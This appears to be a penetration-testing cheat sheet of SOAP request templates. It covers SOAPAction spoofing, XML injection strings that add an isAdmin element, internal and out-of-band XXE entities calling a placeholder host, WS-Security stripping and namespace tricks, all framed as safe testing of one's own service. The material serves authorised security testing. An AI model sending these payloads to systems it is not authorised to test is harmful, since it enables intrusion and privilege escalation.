# SOAP Templates

Replace namespaces, operation names, and `FUZZ` with values from the WSDL. Use only your own harmless read operations.

## SOAP 1.1 envelope

```http
POST /UserService.svc HTTP/1.1
Host: TARGET
Content-Type: text/xml; charset=utf-8
SOAPAction: "http://example.com/IUserService/GetProfile"

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://example.com/">
  <soap:Body>
    <tns:GetProfile><tns:userId>OWN_ID</tns:userId><tns:note>FUZZ</tns:note></tns:GetProfile>
  </soap:Body>
</soap:Envelope>
```

## SOAP 1.2 envelope (action in Content-Type)

```http
Content-Type: application/soap+xml; charset=utf-8; action="http://example.com/IUserService/GetProfile"

<soap12:Envelope xmlns:soap12="http://www.w3.org/2003/05/soap-envelope" xmlns:tns="http://example.com/">
  <soap12:Body><tns:GetProfile><tns:userId>OWN_ID</tns:userId></tns:GetProfile></soap12:Body>
</soap12:Envelope>
```

## SOAPAction spoofing (SOAP-001)

Body calls the allowed operation; header names another (or the reverse):

```
SOAPAction: "http://example.com/IAdminService/ListUsers"     (body: GetProfile)
SOAPAction: ""                                              (empty)
```

## XML injection markers (SOAP-002)

```
smx</tns:note><tns:isAdmin>true</tns:isAdmin><tns:note>smx
smx]]><tns:x>1</tns:x><![CDATA[
smx<!--
smx&lt;b&gt;
```

## Internal entity (safe XXE detection, SOAP-003)

```xml
<?xml version="1.0"?>
<!DOCTYPE soap:Envelope [<!ENTITY smx "smx-entity-expanded">]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tns="http://example.com/">
  <soap:Body><tns:GetProfile><tns:note>&smx;</tns:note></tns:GetProfile></soap:Body>
</soap:Envelope>
```

Reflection of `smx-entity-expanded`, or a different fault than the DOCTYPE-free baseline, shows DTD processing.

## OOB (own host only)

```xml
<!DOCTYPE soap:Envelope [<!ENTITY % x SYSTEM "http://YOUR-OOB-HOST/soap-xxe"> %x;]>
```

## WS-Security header (for stripping/tampering tests on own message)

```xml
<soap:Header>
  <wsse:Security xmlns:wsse="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd"
                 xmlns:wsu="http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd">
    <wsu:Timestamp><wsu:Created>2026-01-01T00:00:00Z</wsu:Created><wsu:Expires>2026-01-01T00:05:00Z</wsu:Expires></wsu:Timestamp>
    <wsse:UsernameToken><wsse:Username>OWN_USER</wsse:Username>
      <wsse:Password Type="...#PasswordText">REDACTED</wsse:Password></wsse:UsernameToken>
  </wsse:Security>
</soap:Header>
```

Variants: remove the whole header; set `Expires` in the past; duplicate the Body inside a header element (signature wrapping review).

## MTOM / XOP include (SOAP-008, own OOB host only)

```xml
<tns:file><xop:Include xmlns:xop="http://www.w3.org/2004/08/xop/include" href="http://YOUR-OOB-HOST/xop"/></tns:file>
```

## Encoding and types (SOAP-009)

- Re-encode the whole message as UTF-16 with `<?xml version="1.0" encoding="UTF-16"?>` (soap_probe.py does this).
- `<tns:userId xsi:type="xsd:int" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">OWN_ID</tns:userId>`
- `<tns:userId xsi:type="SOAP-ENC:Array" SOAP-ENC:arrayType="xsd:string[2]"><item>OWN_ID</item><item>OTHER_OWN_ID</item></tns:userId>`

## Namespace tricks (SOAP-010)

- Change prefixes (`soap:` → `s:`), keep URIs.
- Move the operation to a default namespace: `<GetProfile xmlns="http://example.com/">`.
- Add a duplicate `<userId xmlns="urn:other">OTHER_OWN_ID</userId>` next to the real one.
- Send a SOAP 1.2 envelope with a SOAP 1.1 Content-Type.

## Tools

SoapUI / ReadyAPI, Burp Suite with Wsdler extension, WS-Attacker (signature wrapping, SOAPAction spoofing), `scripts/soap_probe.py`, xml-xxe-audit `xxe_probe.py`.
